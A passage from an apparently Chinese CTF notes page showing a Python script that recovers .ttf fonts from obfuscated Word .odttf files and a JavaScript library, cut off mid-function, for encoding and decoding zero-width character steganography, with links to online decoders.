odttf转ttf</h2><p>当复制文档中的内容至notepad后与原内容不一样，多半是修改了字体</p><p><a href="https://somanchiu.github.io/odttf2ttf/js/demo">在线网站转换</a></p><p>python转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>odttf_name = <span class="hljs-string">&quot;./1F513ACE-F8AD-4F84-9264-C7B38E1D8CB7.odttf&quot;</span><br>odttf_path = os.path.abspath(odttf_name)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(odttf_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># 获取文件名</span><br>file_name = os.path.splitext(odttf_path)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\\&quot;</span>)[-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 获取key</span><br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_name), <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>    key.append(<span class="hljs-built_in">int</span>(file_name[i-<span class="hljs-number">2</span>:i], <span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./font2.ttf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        f.write(<span class="hljs-built_in">bytes</span>([data[i] ^ key[i % <span class="hljs-built_in">len</span>(key)]]))<br>    f.write(data[<span class="hljs-number">32</span>:])<br></code></pre></td></tr></table></figure><p>转换前先修改<code>xxx.odttf</code>文件名为对应的<code>fontKey</code>值(&#x2F;word&#x2F;fontTable.xml)</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/odttf.png"></p><p><a href="https://fontdrop.info/#/?darkmode=true">FontDrop</a>或fontforge识别ttf即可</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="0x01-零宽字符隐写"><a href="#0x01-零宽字符隐写" class="headerlink" title="0x01 零宽字符隐写"></a>0x01 零宽字符隐写</h2><p>零宽度字符隐写术（Zero-Width Space Steganography），将隐藏消息编码和解码为不可打印&#x2F;可读字符。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">字符包括：<br>零宽度空格（\u200b）<br>零宽度非连接符（\u200c）<br>零宽度连接符（\u200d）<br>从左至右书写标记（\u200e）<br>从右至左书写标记（\u200f）<br></code></pre></td></tr></table></figure><p>在线解密工具<br><a href="https://www.mzy0.com/ctftools/zerowidth1/">https://www.mzy0.com/ctftools/zerowidth1/</a><br><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools&#x2F;unicode_steganography.html</a><br><a href="https://offdev.net/demos/zwsp-steg-js">https://offdev.net/demos/zwsp-steg-js</a><br><a href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a><br><a href="http://www.atoolbox.net/Tool.php?Id=829">http://www.atoolbox.net/Tool.php?Id=829</a></p><p>python解密<br><a href="https://github.com/enodari/zwsp-steg-py">https://github.com/enodari/zwsp-steg-py</a></p><p>js解密</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  Zero-Width Unicode Character Steganography</span><br><span class="hljs-comment"> *  Copyright (c) 2015-2016 Kei Misawa</span><br><span class="hljs-comment"> *  This software is released under the MIT License.</span><br><span class="hljs-comment"> *  http://opensource.org/licenses/mit-license.php</span><br><span class="hljs-comment"> */</span><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-built_in">exports</span></span>)&#123;<br>  <span class="hljs-string">&#x27;use strict&#x27;</span>;<br>  <span class="hljs-keyword">var</span> chars = [];<br>  <span class="hljs-keyword">var</span> radix = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">var</span> codelengthText = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">var</span> codelengthBinary = <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Set characters of coded hidden text(zero width characters)</span><br><span class="hljs-comment">    args: string of zero width characters</span><br><span class="hljs-comment">    return: null</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> setUseChars = <span class="hljs-keyword">function</span>(<span class="hljs-params">newchars</span>)&#123;<br>    <span class="hljs-keyword">if</span>(newchars.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">2</span>)&#123;<br>      chars = newchars.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>      radix = chars.<span class="hljs-property">length</span>;<br>      codelengthText = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">65536</span>) / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(radix));<br>      codelengthBinary = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">256</span>) / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(radix));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Text Encoder</span><br><span class="hljs-comment">    args:</span><br><span class="hljs-comment">      text: original text to be embedded (String)</span><br><span class="hljs-comment">      data: text to be hidden (String)</span><br><span class="hljs-comment">    return: unicode stego text</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> encodeText = <span class="hljs-keyword">function</span>(<span class="hljs-params">text1, text2</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">combine_shuffle_string</span>(text1, <span class="hljs-title function_">encode_to_zerowidth_characters_text</span>(text2), codelengthText);<br>  &#125;;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Binary Encoder</span><br><span class="hljs-comment">    args:</span><br><span class="hljs-comment">      text: original text to be embedded (String)</span><br><span class="hljs-comment">      data: data to be hidden (Uint8Array)</span><br><span class="hljs-comment">    return: unicode stego text</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> encodeBinary = <span class="hljs-keyword">function</span>(<span class="hljs-params">text, data</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">combine_shuffle_string</span>(text, <span class="hljs-title function_">encode_to_zerowidth_characters_binary</span>(data), codelengthBinary);<br>  &#125;;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Text Decoder</span><br><span class="hljs-comment">    args: unicode text with steganography (String)</span><br><span class="hljs-comment">    return: JavaScript Object &#123;</span><br><span class="hljs-comment">      originalText: original text (String),</span><br><span class="hljs-comment">      hiddenText: hidden data (String)</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> decodeText = <span class="hljs-keyword">function</span>(<span class="hljs-params">text</span>)&#123;<br>    <span class="hljs-keyword">var</span> splitted = <span class="hljs-title function_">split_zerowidth_characters</span>(text);<br><br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-string">&#x27;originalText&#x27;</span>: splitted.<span class="hljs-property">originalText</span>,<br>      <span class="hljs-string">&#x27;hiddenText&#x27;</span>: <span class="hljs-title function_">decode_from_zero_width_characters_text</span>(splitted.<span class="hljs-property">hiddenText</span>, codelengthText)<br>    &#125;;<br>  &#125;;<br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Binary Decoder</span><br><span class="hljs-comment">    args: unicode text with steganography (String)</span><br><span class="hljs-comment">    return: JavaScript Object &#123;</span><br><span class="hljs-comment">      originalText: original text (String),</span><br><span class="hljs-comment">      hiddenData: hidden data (Uint8Array)</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">var</span> decodeBinary = <span class="hljs-keyword">function</span>(<span class="hljs-params">text</span>)&#123;<br>    <span class="hljs-keyword">var</span> splitted = <span class="hljs-title function_">split_zerowidth_characters</span>(text);<br><br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-string">&#x27;originalText&#x27;</span>: splitted.<span class="hljs-property">originalText</span>,<br>      <span class="hljs-string">&#x27;hiddenData&#x27;</span>: <span class="hljs-title function_">decode_from_zero_width_characters_binary</span>(splitted.<span class="hljs-property">hiddenText</span>)<br>    &#125;;<br>  &#125;;<br><br>  <span class="hljs-title function_">setUseChars</span>(<span class="hljs-string">&#x27;\u200c\u200d\u202c\ufeff&#x27;</span>);<br><br>  <span class="hljs-built_in">exports</span>.<span class="hljs-property">unicodeSteganographer</span> = &#123;<br>    <span class="hljs-attr">encodeText</span>: encodeText,<br>    <span class="hljs-attr">decodeText</span>: decodeText,<br>    <span class="hljs-attr">encodeBinary</span>: encodeBinary,<br>    <span class="hljs-attr">decodeBinary</span>: decodeBinary,<br>    <span class="hljs-attr">setUseChars</span>: setUseChars<br>  &#125;;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">    Internal Functions</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">var</span> encode_to_zerowidth_characters_text = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1</span>)&#123;<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(str1.<span class="hljs-property">length</span>);<br>    <span class="hljs-keyword">var</span> base = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> c;<br>    <span class="hljs-keyword">var</span> d;<br>    <span class="hljs-keyword">var</span> r;<br><br>    <span class="hljs-comment">//var base = &#x27;0&#x27;.repeat(codelength); // IE not support this method</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; codelengthText; i++)&#123;<br>      base += <span class="hljs-string">&#x27;0&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; str1.<span class="hljs-property">length</span>; i++)&#123;<br>      c = str1.<span class="hljs-title function_">charCodeAt</span>(i);<br>      d = c.<span class="hljs-title function_">toString</span>(radix);<br><br>      result[i] = (base + d).<span class="hljs-title function_">substr</span>(-codelengthText);<br>    &#125;<br><br>    r = result.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; radix; i++)&#123;<br>      r = r.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(i, <span class="hljs-string">&#x27;g&#x27;</span>), chars[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> r;<br>  &#125;;<br>  <span class="hljs-keyword">var</span> encode_to_zerowidth_characters_binary = <span class="hljs-keyword">function</span>(<span class="hljs-params">u8ary</span>)&#123;<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(u8ary.<span class="hljs-property">length</span>);<br>    <span class="hljs-keyword">var</span> base = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> c;<br>    <span class="hljs-keyword">var</span> d;<br>    <span class="hljs-keyword">var</span> r;<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; codelengthBinary; i++)&#123;<br>      base += <span class="hljs-string">&#x27;0&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; u8ary.<span class="hljs-property">length</span>; i++)&#123;<br>      d = u8ary[i].<span class="hljs-title function_">toString</span>(radix);<br>      result[i] = (base + d).<span class="hljs-title function_">substr</span>(-codelengthBinary);<br>    &#125;<br><br>    r = result.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; radix; i++)&#123;<br>      r = r.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(i, <span class="hljs-string">&#x27;g&#x27;</span>), chars[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> r;<br>  &#125;;<br>  <span class="hljs-keyword">var</span> combine_shuffle_string = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1, str2, codelength</span>)&#123;<br>    <span class="hljs-keyword">var</span> result = [];<br>    <span class="hljs-keyword">var</span> c0 = str1.<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/([\u0000-\u002F\u003A-\u0040\u005b-\u0060\u007b-\u007f])|([\u0030-\u0039]+)|([\u0041-\u005a\u0061-\u007a]+)|([\u0080-\u00FF]+)|([\u0100-\u017F]+)|([\u0180-\u024F]+)|([\u0250-\u02AF]+)|([\u02B0-\u02FF]+)|([\u0300-\u036F]+)|([\u0370-\u03FF]+)|([\u0400-\u04FF]+)|([\u0500-\u052F]+)|([\u0530-\u058F]+)|([\u0590-\u05FF]+)|([\u0600-\u06FF]+)|([\u0700-\u074F]+)|([\u0750-\u077F]+)|([\u0780-\u07BF]+)|([\u07C0-\u07FF]+)|([\u0800-\u083F]+)|([\u0840-\u085F]+)|([\u08A0-\u08FF]+)|([\u0900-\u097F]+)|([\u0980-\u09FF]+)|([\u0A00-\u0A7F]+)|([\u0A80-\u0AFF]+)|([\u0B00-\u0B7F]+)|([\u0B80-\u0BFF]+)|([\u0C00-\u0C7F]+)|([\u0C80-\u0CFF]+)|([\u0D00-\u0D7F]+)|([\u0D80-\u0DFF]+)|([\u0E00-\u0E7F]+)|([\u0E80-\u0EFF]+)|([\u0F00-\u0FFF]+)|([\u1000-\u109F]+)|([\u10A0-\u10FF]+)|([\u1100-\u11FF]+)|([\u1200-\u137F]+)|([\u1380-\u139F]+)|([\u13A0-\u13FF]+)|([\u1400-\u167F]+)|([\u1680-\u169F]+)|([\u16A0-\u16FF]+)|([\u1700-\u171F]+)|([\u1720-\u173F]+)|([\u1740-\u175F]+)|([\u1760-\u177F]+)|([\u1780-\u17FF]+)|([\u1800-\u18AF]+)|([\u18B0-\u18FF]+)|([\u1900-\u194F]+)|([\u1950-\u197F]+)|([\u1980-\u19DF]+)|([\u19E0-\u19FF]+)|([\u1A00-\u1A1F]+)|([\u1A20-\u1AAF]+)|([\u1AB0-\u1AFF]+)|([\u1B00-\u1B7F]+)|([\u1B80-\u1BBF]+)|([\u1BC0-\u1BFF]+)|([\u1C00-\u1C4F]+)|([\u1C50-\u1C7F]+)|([\u1CC0-\u1CCF]+)|([\u1CD0-\u1CFF]+)|([\u1D00-\u1D7F]+)|([\u1D80-\u1DBF]+)|([\u1DC0-\u1DFF]+)|([\u1E00-\u1EFF]+)|([\u1F00-\u1FFF]+)|([\u2000-\u206F]+)|([\u2070-\u209F]+)|([\u20A0-\u20CF]+)|([\u20D0-\u20FF]+)|([\u2100-\u214F]+)|([\u2150-\u218F]+)|([\u2190-\u21FF]+)|([\u2200-\u22FF]+)|([\u2300-\u23FF]+)|([\u2400-\u243F]+)|([\u2440-\u245F]+)|([\u2460-\u24FF]+)|([\u2500-\u257F]+)|([\u2580-\u259F]+)|([\u25A0-\u25FF]+)|([\u2600-\u26FF]+)|([\u2700-\u27BF]+)|([\u27C0-\u27EF]+)|([\u27F0-\u27FF]+)|([\u2800-\u28FF]+)|([\u2900-\u297F]+)|([\u2980-\u29FF]+)|([\u2A00-\u2AFF]+)|([\u2B00-\u2BFF]+)|([\u2C00-\u2C5F]+)|([\u2C60-\u2C7F]+)|([\u2C80-\u2CFF]+)|([\u2D00-\u2D2F]+)|([\u2D30-\u2D7F]+)|([\u2D80-\u2DDF]+)|([\u2DE0-\u2DFF]+)|([\u2E00-\u2E7F]+)|([\u2E80-\u2EFF]+)|([\u2F00-\u2FDF]+)|([\u2FF0-\u2FFF]+)|([\u3000-\u303F]+)|([\u3040-\u309F]+)|([\u30A0-\u30FF]+)|([\u3100-\u312F]+)|([\u3130-\u318F]+)|([\u3190-\u319F]+)|([\u31A0-\u31BF]+)|([\u31C0-\u31EF]+)|([\u31F0-\u31FF]+)|([\u3200-\u32FF]+)|([\u3300-\u33FF]+)|([\u3400-\u4DBF]+)|([\u4DC0-\u4DFF]+)|([\u4E00-\u9FFF]+)|([\uA000-\uA48F]+)|([\uA490-\uA4CF]+)|([\uA4D0-\uA4FF]+)|([\uA500-\uA63F]+)|([\uA640-\uA69F]+)|([\uA6A0-\uA6FF]+)|([\uA700-\uA71F]+)|([\uA720-\uA7FF]+)|([\uA800-\uA82F]+)|([\uA830-\uA83F]+)|([\uA840-\uA87F]+)|([\uA880-\uA8DF]+)|([\uA8E0-\uA8FF]+)|([\uA900-\uA92F]+)|([\uA930-\uA95F]+)|([\uA960-\uA97F]+)|([\uA980-\uA9DF]+)|([\uA9E0-\uA9FF]+)|([\uAA00-\uAA5F]+)|([\uAA60-\uAA7F]+)|([\uAA80-\uAADF]+)|([\uAAE0-\uAAFF]+)|([\uAB00-\uAB2F]+)|([\uAB30-\uAB6F]+)|([\uAB70-\uABBF]+)|([\uABC0-\uABFF]+)|([\uAC00-\uD7AF]+)|([\uD7B0-\uD7FF]+)|([\uD800-\uDFFF]+)|([\uE000-\uF8FF]+)|([\uF900-\uFAFF]+)|([\uFB00-\uFB4F]+)|([\uFB50-\uFDFF]+)|([\uFE00-\uFE0F]+)|([\uFE10-\uFE1F]+)|([\uFE20-\uFE2F]+)|([\uFE30-\uFE4F]+)|([\uFE50-\uFE6F]+)|([\uFE70-\uFEFF]+)|([\uFF00-\uFFEF]+)|([\uFFF0-\uFFFF]+)/g</span>);<br>    <span class="hljs-keyword">var</span> c1 = [];<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; c0.<span class="hljs-property">length</span>; i++)&#123;<br>      <span class="hljs-keyword">if</span>((<span class="hljs-keyword">typeof</span> c0[i] !== <span class="hljs-string">&#x27;undefined&#x27;</span>) &amp;&amp; (c0[i] !== <span class="hljs-string">&#x27;&#x27;</span>))&#123;<br>        c1.<span class="hljs-title function_">push</span>(c0[i]);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">var</span> c2 = str2.<span class="hljs-title function_">split</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;(.&#123;&#x27;</span> + codelength + <span class="hljs-string">&#x27;&#125;)&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>));<br>    <span class="hljs-keyword">var</span> ratio = c1.<span class="hljs-property">length</span> / (c1.<span class="hljs-property">length</span> + c2.<span class="hljs-property">length</span>);<br><br>    <span class="hljs-comment">/* slow</span><br><span class="hljs-comment">    while((c1.length &gt; 0) &amp;&amp; (c2.length &gt; 0))&#123;</span><br><span class="hljs-comment">      if(Math.random() &lt;= ratio)&#123;</span><br><span class="hljs-comment">        result.push(c1.shift());</span><br><span class="hljs-comment">      &#125;else&#123;</span><br><span class="hljs-comment">        result.push(c2.shift());</span><br><span class="hljs-comment">      &#125;</span><br><span class="hljs-comment">    &#125;*/</span><br>    i = <span class="hljs-number">0</span>;<br>    j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>((i &lt; c1.<span class="hljs-property">length</span>) &amp;&amp; (j &lt; c2.<span class="hljs-property">length</span>))&#123;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &lt;= ratio)&#123;<br>        result.<span class="hljs-title function_">push</span>(c1[i]);<br>        i++;<br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>        result.<span class="hljs-title function_">push</span>(c2[j]);<br>        j++;<br>      &#125;<br>    &#125;<br>    c1 = c1.<span class="hljs-title function_">slice</span>(i);<br>    c2 = c2.<span class="hljs-title function_">slice</span>(j);<br><br>    result = result.<span class="hljs-title function_">concat</span>(c1).<span class="hljs-title function_">concat</span>(c2);<br><br>    <span class="hljs-keyword">return</span> result.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  &#125;;<br>  <span class="hljs-keyword">var</span> split_zerowidth_characters = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1</span>)&#123;<br>    <span class="hljs-keyword">var</span> result = &#123;&#125;;<br>    result.<span class="hljs-property">originalText</span> = str1.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;[&#x27;</span> + chars.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>) + <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>), <span class="hljs-string">&#x27;&#x27;</span>);<br>    result.<span class="hljs-property">hiddenText</span> = str1.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;[^&#x27;</span> + chars.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>) + <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>), <span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-keyword">return</span> result;<br>  &#125;;<br>  <span class="hljs-keyword">var</span> decode_from_zero_width_characters_text = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1</span>)&#123;<br>    <span class="hljs-keyword">var</span> r = str1;<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> result = [];<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; radix; i++)&#123;<br>      r = r.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(chars[i], <span class="hljs-string">&#x27;g&#x27;</span>), i);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; r.<span class="hljs-property">length</span>; i += codelengthText)&#123;<br>      result.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-built_in">parseInt</span>(r.<span class="hljs-title function_">substr</span>(i, codelengthText), radix)));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  &#125;;<br>  <span class="hljs-keyword">var</span> decode_from_zero_width_characters_binary = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1</span>)&#123;<br>    <span class="hljs-keyword">var</span> r = str1;<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> j;<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(str1.<span class="hljs-property">length</span> / codelengthBinary));<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; radix; i++)&#123;<br>      r = r.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(chars[i], <span class="hljs-string">&#x27;g&#x27;</span>), i);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; r.<span class="hljs-property">length</span>; i += 